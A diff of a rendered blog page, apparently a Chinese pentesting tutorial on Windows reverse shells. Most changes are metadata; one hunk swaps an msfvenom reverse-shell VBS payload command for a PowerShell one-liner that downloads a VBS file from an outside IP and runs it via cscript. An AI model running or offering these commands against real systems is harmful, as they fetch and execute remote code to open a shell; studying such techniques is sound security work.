@@ -42,7 +42,7 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207140004307.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207140034057.png">
 <meta property="article:published_time" content="2024-02-06T11:29:46.000Z">
-<meta property="article:modified_time" content="2024-02-07T06:00:36.986Z">
+<meta property="article:modified_time" content="2024-02-12T15:58:58.228Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
@@ -246,7 +246,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5.7k words
+          5.8k words
         
       </span>
     
@@ -257,7 +257,7 @@
         
         
         
-          48 mins
+          49 mins
         
       </span>
     
@@ -445,7 +445,7 @@
 <li><p>上传到http.server上</p>
 </li>
 <li><p>远程加载</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.79.138 <span class="hljs-attribute">LPORT</span>=10000 -f   vbs -o 10000.vbs<br></code></pre></td></tr></table></figure></li>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">powershell.exe -c <span class="hljs-string">&quot;(New-Object System.NET.WebClient).DownloadFile(&#x27;http://139.155.49.43:8000/3.vbs&#x27;,<span class="hljs-subst">\&quot;</span>$env:temp<span class="hljs-subst">\t</span>est.vbs<span class="hljs-subst">\&quot;</span>);Start-Process %windir%\system32\cscript.exe <span class="hljs-subst">\&quot;</span>$env:temp<span class="hljs-subst">\t</span>est.vbs<span class="hljs-subst">\&quot;</span>&quot;</span><br></code></pre></td></tr></table></figure></li>
 </ol>
 <h2 id="msiexec"><a href="#msiexec" class="headerlink" title="msiexec"></a>msiexec</h2><p>msi文件格式</p>
 <ol>
